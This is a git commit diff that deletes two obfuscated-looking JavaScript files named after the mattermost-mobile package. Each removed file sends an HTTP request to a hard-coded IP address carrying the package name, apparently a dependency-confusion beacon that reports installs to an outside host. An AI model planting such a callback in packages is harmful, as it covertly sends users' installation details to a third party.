a640267cad3dd2697803cad95664146775e1fef8
Leila-Masimli <masimlileila@gmail.com>
2025-03-10 23:49:02 +0100

    Removed obf files from Git

--- my_packages_obf/mattermost-mobile/index (num_to_exp).js
+++
@@ -1,5 +0,0 @@
-const request = require('requests');
-let host = '128.199.122.145';
-let packages = 'mattermost-mobile';
-request('http://' + host + '/?' + packages, (_0x2f3156, _0x1328d3, _0x16dff0) => {
-});
--- my_packages_obf/mattermost-mobile/index (simplify).js
+++
@@ -1,4 +0,0 @@
-const request = require('requests');
-let host = '128.199.122.145', packages = 'mattermost-mobile';
-request('http://' + host + '/?' + packages, (_0xe400df, _0x1dcedf, _0x4cfc18) => {
-});
